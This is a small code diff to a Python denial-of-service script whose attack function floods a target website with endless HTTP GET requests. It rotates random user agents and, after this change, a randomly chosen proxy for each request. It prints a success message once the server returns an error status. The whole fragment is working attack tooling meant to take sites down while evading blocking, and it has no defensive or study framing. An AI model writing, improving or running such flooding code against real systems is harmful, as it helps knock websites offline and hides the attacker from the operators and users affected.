@@ -80,7 +80,7 @@ def attack(target, proxyfile):
         while True:
             r += 1
             headers = {'user-agent': random.choice(headers_useragents).strip()}
-            proxies = {'http': proxylist,'https': proxylist}
+            proxies = {'http': random.choice(proxylist),'https': random.choice(proxylist)}
             req = requests.get(target, headers=headers, proxies=proxies, timeout=attktime, verify=False)
             if req.status_code >= 500:
                 print(f"{G}[+] Target Website is down! DDoS attack successful!")
